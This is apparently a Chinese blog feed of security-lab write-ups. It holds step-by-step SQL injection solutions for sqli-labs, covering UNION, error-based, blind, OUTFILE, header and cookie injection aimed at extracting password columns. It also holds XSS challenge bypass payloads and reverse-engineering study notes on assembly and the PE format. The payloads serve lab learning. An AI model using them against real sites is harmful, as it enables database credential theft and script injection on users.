<li><p><code>?id=-1 &#39; union select 1,(select group_concat(password) from users) ,3 --+</code><br>得出账户密码<br><a href="https://imgchr.com/i/kHpan0"><img src="https://s2.ax1x.com/2019/02/28/kHpan0.png" alt="kHpan0.png"></a></p>
</li>
</ol>
<hr>
<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><ul>
<li><code>?id=1&#39;</code>报错</li>
<li><code>?id=1 and 1=1</code>正确</li>
<li><code>?id=1 and 1=2</code>错误<br>可知是数字型注入</li>
</ul>
<p><em>解题与第一题类似，不再赘述</em></p>
<hr>
<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>查看源码可知，用<code>()</code>加在了id两边，所以只要将<code>()</code>闭合就行了<br><code>?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br><code>?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3--+</code><br><code>?id=-1&#39;) union select 1,(select group_concat(password) from users),3--+</code></p>
<p><a href="https://imgchr.com/i/kHbj8P"><img src="https://s2.ax1x.com/2019/03/01/kHbj8P.png" alt="kHbj8P.png"></a></p>
<hr>
<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>查看源码，id两边加了”,用<code>?id=-1&quot;) </code>闭合</p>
<hr>
<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p><strong><em>双注入</em></strong></p>
<ol>
<li>Rand() //随机函数</li>
<li>Floor() //取整函数</li>
<li>Count() //汇总函数</li>
<li>Group by clause //分组语句</li>
</ol>
<p><a href="https://blog.csdn.net/Leep0rt/article/details/78556440">https://blog.csdn.net/Leep0rt/article/details/78556440</a></p>
<p><code>?id=1&#39; union select count(*),1,concat((select database()), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+</code><br><a href="https://imgchr.com/i/kbMSh9"><img src="https://s2.ax1x.com/2019/03/01/kbMSh9.png" alt="kbMSh9.png"></a><br>select 查询列数要相同，否则报错</p>
<p><code>?id=1&#39; union select count(*),1,concat((select password from users limit 5,1), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+</code><br><a href="https://imgchr.com/i/kbQiCj"><img src="https://s2.ax1x.com/2019/03/01/kbQiCj.png" alt="kbQiCj.png"></a><br>用<code>group_concat</code>会报错，使用<code>limit</code></p>
<p>更新于2019-03-01 22:21:15 星期五</p>
<hr>
<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>尝试注入后可知是用<code>&quot;</code>闭合，字符串型<br>其他和上题一致<br><code>?id=1&quot;  union select count(*),concat( (select user()),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p>
<p><a href="https://imgchr.com/i/kLirA1"><img src="https://s2.ax1x.com/2019/03/03/kLirA1.png" alt="kLirA1.png"></a></p>
<p><code>?id=1&quot;  union select count(*),concat( (select table_name from information_schema.tables where table_schema=database() limit 3,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p>
<p><code>?id=1&quot;  union select count(*),concat( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 5,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p>
<p><code>?id=1&quot;  union select count(*),concat( (select password from users limit 0,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p>
<p>更新于2019-03-03 11:48:51 星期日</p>
<hr>
<h2 id="Lss-7"><a href="#Lss-7" class="headerlink" title="Lss-7"></a>Lss-7</h2><h5 id="利用outfile文件"><a href="#利用outfile文件" class="headerlink" title="利用outfile文件"></a>利用outfile文件</h5><p><em>一般在Sql查询语句中，想要正常查询到信息，只能在最里层有引号，外层全是小括号。即已知注入类型后依次增加括号数必能分析出括号数（存在注入点）。<br>数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限<br>需要在指定的目录下进行数据的导出。<br>需要注意的是利用数据库file权限向操作系统写入文件时， 对于相同文件名的文件不能覆盖</em></p>
<p><em>secure_file_priv这个参数用来限制数据导入和导出操作的效果，例如执行load data、into outfile语句和load_file()函数,这些操作需要用户具有file权限。</em></p>
<ol>
<li>如果这个参数为空，这个变量没有效果。</li>
<li>如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它.</li>
<li>如果这个参数为null，Mysql服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入。</li>
</ol>
<p><em>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径</em></p>
<p><em>在Mysql中，需要注意路径转义的问题，即用\分隔。</em></p>
<p><strong><a href="https://www.jianshu.com/p/7b9256de20d1">https://www.jianshu.com/p/7b9256de20d1</a></strong></p>
<p>经过测试，用<code>&#39;))</code> 来闭合</p>
<p><code>?id=1&#39;)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile &quot;C:\\xampp\\mysql\\data\\security\\4.txt&quot; --+</code></p>
<p><a href="https://imgchr.com/i/kXV2Tg"><img src="https://s2.ax1x.com/2019/03/04/kXV2Tg.png" alt="kXV2Tg.png"></a></p>
<p><code>?id=1&#39;)) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;) into outfile &quot;C:\\xampp\\mysql\\data\\security\\5.txt&quot; --+</code></p>
<p><a href="https://imgchr.com/i/kXVb0U"><img src="https://s2.ax1x.com/2019/03/04/kXVb0U.png" alt="kXVb0U.png"></a></p>
<p><code>?id=1&#39;)) union select 1,2,(select group_concat(password) from users) into outfile &quot;C:\\xampp\\mysql\\data\\security\\6.txt&quot; --+</code></p>
<p><a href="https://imgchr.com/i/kXZS6x"><img src="https://s2.ax1x.com/2019/03/04/kXZS6x.png" alt="kXZS6x.png"></a></p>
<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><h5 id="盲注布尔注入"><a href="#盲注布尔注入" class="headerlink" title="盲注布尔注入"></a>盲注布尔注入</h5><p><em>当一个页面，存在注入，没显示位，没有数据库出错信息，只能通过页面返回正常不正常进行判断进行sql注入。</em></p>
<ol>
<li>exists（）<br>用于检查  子查询是否有返回数据。 结果是 ture或者false</li>
<li>ascii（）<br>把字符转化成ascii码</li>
<li>substr（）<br>substr（string string，num start，num length）；<br>偏移从1开始的 并不是0；</li>
</ol>
<p><em>DISTINCT 去重复</em><br><code>?id=1&#39; and (select ascii(substr( (select database()) ,1,1))&gt;115) --+ </code></p>
<p><code>?id=1&#39; and ((select count(distinct+table_schema) from information_schema.tables)&gt;6)--+</code></p>
<p><code>?id=1&#39; and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101)--+</code></p>
<p><code>?id=1&#39; and (select ascii(substr( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1) ,1,1))&gt;11) --+</code></p>
<p><code>?id=1&#39; and (select ascii(substr( (select password from users limit 0,1) ,1,1))&gt;68) --+</code></p>
<p><em>select database() 作为一个语句加括号</em><br>用脚本来跑</p>
<p>更新于2019-03-04 23:09:10 星期一</p>
<hr>
<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><h5 id="盲注基于时间"><a href="#盲注基于时间" class="headerlink" title="盲注基于时间"></a>盲注基于时间</h5><p><em>if( expr1 , expr2 , expr3 ) expr1 true 返回expr2 false 返回 expr3</em></p>
<p><code>?id=1&#39; and if((select ascii(substr(database(),1,1)))=115,sleep(5),1) --+</code></p>
<p>利用页面返回时间判断对错<br>例如<br><code>?id=1&#39; and if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101,sleep(5),1) --+</code></p>
<hr>
<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>与上题相同，不过利用<code>&quot;</code>进行闭合</p>
<p>更新于2019-03-06 20:29:31 星期三</p>
<hr>
<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><pre><code>GET - 从指定的资源请求数据。
POST - 向指定的资源提交要被处理的数据</code></pre>
<p>输入<code>&#39;</code>报错，知用<code>&#39;</code>闭合<br><code>uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; or &#39;1&#39;=&#39;1&amp;submit=Submit</code><br>可以直接爆出来<br>其他相同<br><code>uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; union select 1,2#&amp;submit=Submit</code><br><a href="https://imgchr.com/i/A9VId1"><img src="https://s2.ax1x.com/2019/03/10/A9VId1.png" alt="A9VId1.png"></a></p>
<hr>
<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>实验可知用<code>&quot;)</code>闭合<br>其他相同</p>
<hr>
<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>实验知用<code>&#39;)</code> 闭合<br>其他相同，例如</p>
<p><code>uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(database()))) #&amp;submit=Submit</code></p>
<p><a href="https://imgchr.com/i/A9aHHI"><img src="https://s2.ax1x.com/2019/03/10/A9aHHI.png" alt="A9aHHI.png"></a></p>
<p><code>uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) #&amp;submit=Submit</code></p>
<p><a href="https://imgchr.com/i/A9azvQ"><img src="https://s2.ax1x.com/2019/03/10/A9azvQ.png" alt="A9azvQ.png"></a></p>
<hr>
<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>实验知用<code>&quot;</code>闭合<br>其他和上题相同</p>
<hr>
<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>实验知用<code>&#39;</code>闭合<br>但没用报错信息<br>所以使用时间或布尔注入<br><code>uname=&#39; or if(ascii(substr(database(),1,1))=115,sleep(0.5),1) #&amp;passwd=1&amp;submit=Submit</code></p>
<hr>
<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>实验知用<code>&quot;</code>闭合<br>其他和上题相同</p>
<hr>
<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>在uname中注入，都没有反应<br>在password中注入，也没有反应<br>后知先验证用户名正确后，才执行password</p>
<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p><code>uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,version(),0x7e),1)# &amp;submit=Submit</code></p>
<p><a href="https://imgchr.com/i/A98NW9"><img src="https://s2.ax1x.com/2019/03/10/A98NW9.png" alt="A98NW9.png"></a></p>
<p><code>uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)# &amp;submit=Submit</code></p>
<p><a href="https://imgchr.com/i/A9JFUS"><img src="https://s2.ax1x.com/2019/03/10/A9JFUS.png" alt="A9JFUS.png"></a><br>其他相同</p>
<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>使用正确账号密码后，页面显示user-agent，则可以在这上面注入</p>
<p><code>1&#39; and extractvalue(1,concat(0x7e,(select user()),0x7e)) and &#39;1&#39;=&#39;1</code><br><a href="https://imgchr.com/i/A9Nzi8"><img src="https://s2.ax1x.com/2019/03/10/A9Nzi8.png" alt="A9Nzi8.png"></a><br><code>1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e)) and &#39;1&#39;=&#39;1</code><br><a href="https://imgchr.com/i/A9UGo6"><img src="https://s2.ax1x.com/2019/03/10/A9UGo6.png" alt="A9UGo6.png"></a><br>其他相同<br><em>HTTP 请求头中除了 User-Agent可能存在sql注入意外，还有referer、X-Forwarded-For可能存在sql注入。</em></p>
<p>更新于2019-03-10 22:43:03 星期日</p>
<hr>
<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>参考上题<br>输入正确用户和密码后，跳出页面</p>
<p><a href="https://imgchr.com/i/ACy1bD"><img src="https://s2.ax1x.com/2019/03/11/ACy1bD.png" alt="ACy1bD.png"></a></p>
<p>差不多知道在<code>referer</code>上注入<br><code>&#39; and (extractvalue(1,concat(0x7e,(select version()),0x7e)) ) and &#39;1&#39;=&#39;1</code><br>不能用<code>#</code>注释，因为后面还有语句存在</p>
<p><a href="https://imgchr.com/i/ACyvqO"><img src="https://s2.ax1x.com/2019/03/11/ACyvqO.png" alt="ACyvqO.png"></a></p>
<p><code>&#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),0x7e)) ) and &#39;1&#39;=&#39;1</code></p>
<p><a href="https://imgchr.com/i/AC6Kij"><img src="https://s2.ax1x.com/2019/03/11/AC6Kij.png" alt="AC6Kij.png"></a></p>
<p>更新于2019-03-10 22:43:03 星期日</p>
<hr>
<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>由题目知注入点在Cookie中</p>
<p><em>这里我犯了个错误，由于没有拦截，修改Cookie后，直接点刷新不会出结果，需要重新载入页面</em></p>
<p>输入<code>&#39;</code><br><a href="https://imgchr.com/i/AkUjaj"><img src="https://s2.ax1x.com/2019/03/13/AkUjaj.th.png" alt="AkUjaj.th.png"></a><br>报错存在注入点</p>
<p>接下来可以用第一题用的<br><code>&#39; union select 1,2,database()#</code><br><a href="https://imgchr.com/i/AkU7xf"><img src="https://s2.ax1x.com/2019/03/13/AkU7xf.th.png" alt="AkU7xf.th.png"></a></p>
<p><code>&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema =database()#</code><br><a href="https://imgchr.com/i/Akauz6"><img src="https://s2.ax1x.com/2019/03/13/Akauz6.th.png" alt="Akauz6.th.png"></a></p>
<p>也可以用报错注入<br><code>&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code><br><a href="https://imgchr.com/i/AkaQsO"><img src="https://s2.ax1x.com/2019/03/13/AkaQsO.th.png" alt="AkaQsO.th.png"></a></p>
<hr>
<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>查看Cookie<br><code>YWRtaW4</code>进行解密，知是用base64加密的<code>admin</code><br>所以只要将上题内容加密即可</p>
<hr>
<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>查看cookie<br><code>admin&#39; and 1=1 #</code>没有查询结果<br><code>admin&quot; and 1=1 #</code>结果正确<br>知是用<code>&quot;</code>闭合<br>其他方法与前题相同</p>
<p>更新于2019-03-13 20:26:48 星期三</p>
<hr>
]]></content>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS 20关挑战</title>
    <url>/2019/03/01/xss/</url>
    <content><![CDATA[<h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p>反射型XSS也被称为非持久性CSS<br>当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。</p>
<p>alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。</p>
<p>查看源码<code>window.alert = function()  </code><br><code>echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</code>没有过滤<br>直接调用函数就可以通关<code>&lt;script&gt;window.alert()&lt;/script&gt;</code></p>
<p><em><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。</em></p>
<a id="more"></a>
<hr>
<h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>利用页面元素看到输入在<code>&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;</code><br>闭合input语句即可<br><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</code><br><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code></p>
<p><a href="https://imgchr.com/i/kqT7Ed"><img src="https://s2.ax1x.com/2019/03/03/kqT7Ed.png" alt="kqT7Ed.png"></a></p>
<hr>
<h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p>查看页面元素<code>&lt;input name=keyword  value=&#39;1&#39;&gt;</code>在input语句里<br>尝试闭合无用<br>查看源码<code>str</code>都加上了<code>htmlspecialchars</code>函数，但默认配置是不过滤单引号的<br><code>&#39;onmouseover=&#39;window.alert()</code>即可</p>
<p>输入<code>&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;=&quot;&quot;&gt;</code><br>输入<code>&#39;&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;&#39;=&quot;&quot;&gt;</code><br>输入<code>&#39;onclick&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick&#39;&#39;=&quot;&quot;&gt;</code><br>输入<code>onclick=</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick=&quot;&quot;&gt;</code></p>
<hr>
<h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p>输入<code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code><br>查看可知<code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; scriptalert()=&quot;&quot; script&quot;&quot;=&quot;&quot;&gt;</code>过滤了<code>&lt;</code> <code>&gt;</code><br>利用上节方法<br><code>&quot;onclick=&quot;alert()</code></p>
<p>更新于2019-03-03 11:19:50 星期日</p>
<hr>
<h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>试过后发现<code>onclick</code>变为<code>o_nclick</code><br><code>script</code>变为<code>sc_ript</code><br>使用<code>&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt;</code></p>
<hr>
<h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><p><code>onclick script href</code>输入后都进行了变化<br><code>&quot;&gt;&lt;a HRef=&quot;javascript:alert()&quot;&gt;</code><br><code>keyword=&quot;ONclick=&quot;alert()</code><br><code>keyword=&quot;&gt;&lt;scriPt&gt;alert()&lt;/SCRIpt&gt;&lt;&quot;</code><br><code>keyword=&quot;&gt;&lt;a HreF=javascript:alert()&gt;213&lt;/a&gt;&quot;&lt;</code><br>进行大小写替换可以</p>
<hr>
<h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><code>script</code>被过滤，改变大小写也没有用<br><code>on</code>被过滤<br><code>href</code>同样如此<br><code>keyword=&quot;&gt;&lt;scriscriptpt&gt;alert()&lt;/scrscriptipt&gt;&lt;&quot;</code><br>利用双写绕过</p>
<p>更新于2019-03-06 21:20:39 星期三</p>
<hr>
<h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p>这题可以添加链接<br>直接使用<code>javascript:alert(1)</code><br>但并没有用，查看源码<code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code>被替换了<br>使用制表符绕过<code>%09</code><br><code>keyword=javasc%09ript%3Aalert%281%29&amp;submit=添加友情链接</code></p>
<hr>
<h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>上题结果没有用，查看源码<code>if(false===strpos($str7,&#39;http://&#39;))</code><br>知一定要有<code>http://</code><br>在javascript伪协议里面，属于js范畴，所以单行注释符是可以使用的<br><code>javasc%09ript%3Aalert%281%29//http://www.test.com</code></p>
<hr>
<h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><p>查看页面元素<br><a href="https://imgchr.com/i/AdFKeI"><img src="https://s2.ax1x.com/2019/03/27/AdFKeI.th.png" alt="AdFKeI.th.png"></a><br>有几个隐藏的值，注入点就在这<br><code>keyword=test&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()</code><br><a href="https://imgchr.com/i/AdkZNV"><img src="https://s2.ax1x.com/2019/03/27/AdkZNV.th.png" alt="AdkZNV.th.png"></a></p>
<hr>
<h2 id="更新于2019-03-27-18-15-42-星期三"><a href="#更新于2019-03-27-18-15-42-星期三" class="headerlink" title="更新于2019-03-27 18:15:42 星期三"></a>更新于2019-03-27 18:15:42 星期三</h2>]]></content>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>《逆向工程核心原理》学习笔记1</title>
    <url>/2019/11/19/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
    <content><![CDATA[<p>买这本书有一年了，但只看了一点点，希望能学完</p>
<ol>
<li>保存更改到可执行文件，<em>1保存到COPY TO EXECUTABLE FILE</em>，<em>2选择SAVE FILE</em></li>
<li>应用程序被加载到内存时，有一最小分配空间</li>
<li>space = assemble，用于更改代码<a id="more"></a></li>
<li>大端序 12 34 </li>
<li>小端序 34 12 一个字节里顺序一样</li>
<li>逆序压栈，栈FILO</li>
<li>栈窗口，address-relative to EBP</li>
<li>EBP ESP 存储的是栈地址-》代表数据</li>
<li>1.CALL 压入下一地址 -1 2.PUSH 压入上一栈帧基地址 -1 3.MOV EBP ESP 4. MOV ESP EBP 5.POP EBP 取出基地址 +1 6.RETN 取出下一地址+1</li>
<li>local 局部变量 ARG 参数</li>
<li>test = and =0 则 ZF=1 JE ZF=1 跳转</li>
<li>局部对象存储在栈区</li>
<li>选中地址，Follow in dump</li>
<li>dump中，long-address with ASCII dump</li>
<li>VB使用unicode</li>
<li>API get…Text</li>
<li>调试前预测代码的实现</li>
<li>先上托，找到栈帧生成部分</li>
</ol>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>《逆向工程核心原理》学习笔记2</title>
    <url>/2019/11/20/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</url>
    <content><![CDATA[<ol>
<li>栈就是一小段内存空间，大小记录在PE头中</li>
<li>RETN 8 =RETN POP 8 stdcall清理方式 被调用者清理，cdecl调用者清理</li>
<li>Nags 唠叨</li>
<li>VB ThunRTMain 函数 调用消息框 rtcMsgBox<a id="more"></a></li>
<li>Set Breakpoint on every call to rtcMsgBox</li>
<li>1 opcode == 1 byte</li>
<li>4 bytes == 1 dword</li>
<li>registers is 32 bit</li>
</ol>
<hr>
<h5 id="Lena视频学习"><a href="#Lena视频学习" class="headerlink" title="Lena视频学习"></a>Lena视频学习</h5><p><em>这是书本介绍的，这是<a href="https://tuts4you.com/download/2876/" title="tuts4you">tuts4you</a>crackme下载地址，里面还有视频教程和一些其他教程。</em></p>
<h5 id="Assembler-The-Basics-In-Reversing"><a href="#Assembler-The-Basics-In-Reversing" class="headerlink" title="Assembler : The Basics In Reversing"></a>Assembler : The Basics In Reversing</h5><p>SS stack segment<br>C-Flag &gt;FFFFFFFF  and &lt;0 时设置<br><code>segmens(a page in a book) + offsets(a specific line on that page)</code></p>
<pre><code>add eax,ebx                    ;; Register, Register
add eax,123                    ;; Register, Value
add eax,dword ptr [404000]            ;; Register, Dword Pointer [value]
add eax,dword ptr [eax]            ;; Register, Dword Pointer [register]
add eax,dword ptr [eax+00404000]    ;; Register, Dword Pointer [register+value]
add dword ptr [404000],eax            ;; Dword Pointer [value], Register
add dword ptr [404000],123        ;; Dword Pointer [value], Value
add dword ptr [eax],eax            ;; Dword Pointer [register], Register
add dword ptr [eax],123            ;; Dword Pointer [register], Value
add dword ptr [eax+404000],eax        ;; Dword Pointer [register+value], Register
add dword ptr [eax+404000],123        ;; Dword Pointer [register+value], value</code></pre>
<p>INT3 and INTO are interrupt calls that take no parameters but call the handlers for interrupts 3 and 4, respectively.</p>
<pre><code>JA*    -    Jump if (unsigned) above            - CF=0 and ZF=0
JAE    -    Jump if (unsigned) above or equal        - CF=0
JB*    -    Jump if (unsigned) below            - CF=1
JBE    -    Jump if (unsigned) below or equal        - CF=1 or ZF=1
JC    -    Jump if carry flag set            - CF=1
JCXZ    -    Jump if CX is 0                - CX=0
JE**    -    Jump if equal                    - ZF=1
JECXZ    -    Jump if ECX is 0                - ECX=0
JG*    -    Jump if (signed) greater            - ZF=0 and SF=OF (SF = Sign Flag)
JGE*    -    Jump if (signed) greater or equal        - SF=OF
JL*    -    Jump if (signed) less                - SF != OF (!= is not)
JLE*    -    Jump if (signed) less or equal        - ZF=1 and OF != OF
JMP**    -    Jump                        - Jumps always
JNA    -    Jump if (unsigned) not above        - CF=1 or ZF=1
JNAE    -    Jump if (unsigned) not above or equal    - CF=1
JNB    -    Jump if (unsigned) not below        - CF=0
JNBE     -    Jump if (unsigned) not below or equal    - CF=0 and ZF=0
JNC    -    Jump if carry flag not set            - CF=0
JNE**    -    Jump if not equal                - ZF=0
JNG    -    Jump if (signed) not greater            - ZF=1 or SF!=OF
JNGE    -    Jump if (signed) not greater or equal    - SF!=OF
JNL    -    Jump if (signed) not less            - SF=OF
JNLE    -    Jump if (signed) not less or equal        - ZF=0 and SF=OF
JNO    -    Jump if overflow flag not set        - OF=0
JNP    -    Jump if parity flag not set            - PF=0
JNS    -    Jump if sign flag not set            - SF=0
JNZ    -    Jump if not zero                - ZF=0
JO    -    Jump if overflow flag is set            - OF=1
JP    -    Jump if parity flag set            - PF=1
JPE    -    Jump if parity is equal            - PF=1
JPO    -    Jump if parity is odd                - PF=0
JS    -    Jump if sign flag is set            - SF=1
JZ    -    Jump if zero                    - ZF=1</code></pre>
<h6 id="LEA-Load-Effective-Address"><a href="#LEA-Load-Effective-Address" class="headerlink" title="LEA (Load Effective Address)"></a>LEA (Load Effective Address)</h6><p>Syntax: LEA dest,src<br>LEA can be treated the same way as the MOV instruction. It isn’t used too much for its original function, but more for quick multiplications like this:<br>   <code>  lea eax, dword ptr [4*ecx+ebx]</code><br> *<em>which gives eax the value of 4</em>ecx+ebx**<br><del>ptr== pointer</del></p>
<h6 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h6><p>Syntax: POP dest<br>POP loads the value of byte/word/dword ptr <strong>[esp] jian接寻址 esp指向的值zuo wei dizhi</strong>and puts it into dest. </p>
<h6 id="TEST"><a href="#TEST" class="headerlink" title="TEST"></a>TEST</h6><p>Syntax: TEST operand1, operand2<br>This instruction is in 99% of all cases used for “TEST EAX, EAX”. It performs a Logical<br>AND(AND instruction)<code> but does not save the values</code>.** It only sets the Z-Flag, when EAX is 0 or clears it, when EAX is not 0. The O/C flags are always cleared.**</p>
<h6 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h6><p>Syntax: XOR dest,src<br>The XOR instruction connects two values using logical exclusive OR (remember OR uses inclusive OR).<br><code>This instruction clears the O-Flag and the C-Flag and can set the Z-Flag.</code><br>To understand XOR better, consider those two binary values:</p>
<pre><code>                                1001010110
                                0101001101</code></pre>
<p><code> If you XOR them, the result is 1100011011</code></p>
<p>The most often seen use of XOR is “XOR, EAX, EAX”.<code> This will set EAX to 0,</code> because when you XOR a value with itself, the result is always 0. I hope you understand why, else<br>write down a value on paper and try ;)</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>《逆向工程核心原理》学习笔记3</title>
    <url>/2019/11/21/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/</url>
    <content><![CDATA[<ol>
<li>windows程序运行在Ring 3级，但要运行在内核级（Ring 0），使用API请求，API存储在dll中</li>
<li>FFFFFFFF==-1</li>
<li>双击可改变FLAG 寄存器值<a id="more"></a></li>
<li>双击EIP回去 in ollydbg</li>
<li>info 从一个API中返回总在EAX中</li>
<li>PE文件。内存节区头要在各自最小基本单位的倍数上，所以使用NULL填充</li>
<li>RVA+imageBase==VA(绝对地址）</li>
<li>PE头内部使用RVA</li>
<li>4D5A =,,,MZ （PE文件开头，IMAGE_DOS_HEADER)</li>
<li>INTEL 小端序：：e_lfanew==000000E0</li>
<li>32位EXE ImageBase == 00400000</li>
</ol>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>《逆向工程核心原理》学习笔记4</title>
    <url>/2019/11/29/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/</url>
    <content><![CDATA[<p>在PE文件中找到什么，在内存同样可以找到</p>
<h5 id="PE文件组成"><a href="#PE文件组成" class="headerlink" title="PE文件组成"></a>PE文件组成</h5><pre><code>DOS header 
DOS stub
PE file header
Image Optional Header
Section table
Data Directories
Sections</code></pre>
<a id="more"></a>
<p>PE header 通常位于[imagebase]~[imagebase+1000]<br>memory double click</p>
<p>改变PE entry point 以跳过一些代码<br>binary fill with nops<br>PE header通常大小是1000h</p>
<p>EAT 库用来方便其他程序使用函数</p>
